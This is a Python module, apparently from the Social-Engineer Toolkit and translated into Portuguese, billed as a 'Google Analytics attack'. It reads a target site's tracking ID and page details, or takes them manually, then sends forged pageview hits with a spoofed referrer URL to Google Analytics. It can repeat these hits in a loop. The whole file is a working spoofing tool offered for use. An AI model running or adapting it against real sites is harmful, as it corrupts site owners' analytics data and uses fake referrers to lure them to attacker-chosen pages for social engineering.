#!/usr/bin/env python
from __future__ import print_function
print("Carregando módulo. Por favor, aguarde...")
import src.core.setcore
import sys
import requests
import re
import time
import random

try:
    input = raw_input
except NameError:
    pass

MAIN="Ataque Google Analytics por @ZonkSec"
AUTHOR="Tyler Rosonke (@ZonkSec) E (@Timatias)"

### PRINCIPAL ###
def main():
    print_title()
    # determina se automático ou manual, e chama as funções
    mode_choice = input("[*] Escolha o modo (automático/manual): ")
    if mode_choice in ("automático", "auto"):
        print("\n[*] Entrando no modo automático.\n")
        url = input("[*] Site alvo (Ex.: 'http://xyz.com/'): ")
        params = auto_params(url)
    elif mode_choice in ("manual", "man"):
        print("\n[*] Entrando no modo manual.")
        params = manual_params()
    else:
        print("\n[-] Modo inválido.\n")
        sys.exit()
    # parâmetros foram coletados, solicita para imprimir
    print("\n[+] Payload pronto.")
    printchoice = input("\n[*] Imprimir payload?(y/n): ")
    if printchoice == "y":
        print_params(params)

    # envia requisição
    input("\nPressione <enter> para enviar o payload.")
    send_spoof(params)

    # solicita loop, chama função se necessário
    loopchoice = input("\n[*] Enviar payload em loop?(y/n) ")
    if loopchoice == "y":
        looper(params)
    input("\n\nEste módulo foi concluído. Pressione <enter> para continuar.")

### print_params - percorre params e imprime
def print_params(params):
    print()
    for entry in params:
        print(entry + " = " + params[entry])

### looper - solicita segundos para dormir, inicia o loop
def looper(params):
    secs = input("[*] Segundos entre o envio do payload: ")
    input("\nEnviando requisição a cada "+secs+" segundos. Use CTRL+C para terminar. Pressione <enter> para iniciar o loop.")
    while True:
        send_spoof(params)
        time.sleep(int(secs))

### send_spoof - randomiza o id do cliente, então envia requisição ao serviço do google
def send_spoof(params):
    params['cid'] = random.randint(100, 999)
    r = requests.get('https://www.google-analytics.com/collect', params=params)
    print("\n[+] Payload enviado.")
    print(r.url)

### auto_params - faz requisição ao site alvo, busca por params com regex
def auto_params(url):
    try: # analisa URL para host e página
        m = re.search('(https?:\/\/(.*?))\/(.*)', url)
        host = str(m.group(1))
        page = "/" + str(m.group(3))
    except:
        print("\n[-] Não foi possível analisar a URL para host/página. Você esqueceu uma '/' no final?\n")
        sys.exit()
    try: # faz requisição à página alvo
        r = requests.get(url)
    except:
        print("\n[-] Não foi possível acessar o site alvo para análise.\n")
        sys.exit()
    try: # analisa a página alvo para obter o título
        m = re.search('<title>(.*)<\/title>', r.text)
        page_title = str(m.group(1))
    except:
        print("\n[-] Não foi possível analisar a página alvo para obter o título.\n")
        sys.exit()
    try: # analisa a página alvo para obter o id de rastreamento
        m = re.search("'(UA-(.*))',", r.text)
        tid = str(m.group(1))
    except:
        print("\n[-] Não foi possível encontrar o TrackingID (UA-XXXXX). O site pode não estar rodando Google Analytics.\n")
        sys.exit()
    # monta o dicionário de parâmetros
    params = {}
    params['v'] = "1"
    params['tid'] = tid
    params['cid'] = "555"
    params['t'] = "pageview"
    params['dh'] = host
    params['dp'] = page
    params['dt'] = page_title
    params['aip'] = "1"
    params['dr'] = input("\n[*] Digite a URL de referência para spoof (Ex.: 'http://xyz.com/'): ")
    return params

### manual_params - solicita todos os parâmetros
def manual_params():
    params = {}
    params['v'] = "1"
    params['tid'] = input("\n[*] Digite o TrackingID (tid)(UA-XXXXX): ")
    params['cid'] = "555"
    params['t'] = "pageview"
    params['aip'] = "1"
    params['dh'] = input("[*] Digite o host alvo (dh)(Ex.: 'http://xyz.xyz'): ")
    params['dp'] = input("[*] Digite a página alvo (dp)(Ex.: '/sobre'): ")
    params['dt'] = input("[*] Digite o título da página alvo (dt)(Ex.: 'Sobre Mim'): ")
    params['dr'] = input("[*] Digite a página de referência para spoof (dr): ")
    return params

### print_titulo - imprime o título e referências
def print_title():
    print("\n----------------------------------")
    print("      Ataque Google Analytics     ")
    print("    Por Tyler Rosonke (@ZonkSec) & (@Timatias)  ")
    print("----------------------------------\n")
    print("Guia do Usuário: http://www.zonksec.com/blog/social-engineering-google-analytics/\n")
    print("Referências:")
    print("-https://developers.google.com/analytics/devguides/collection/protocol/v1/reference")
    print("-https://developers.google.com/analytics/devguides/collection/protocol/v1/parameters\n\n")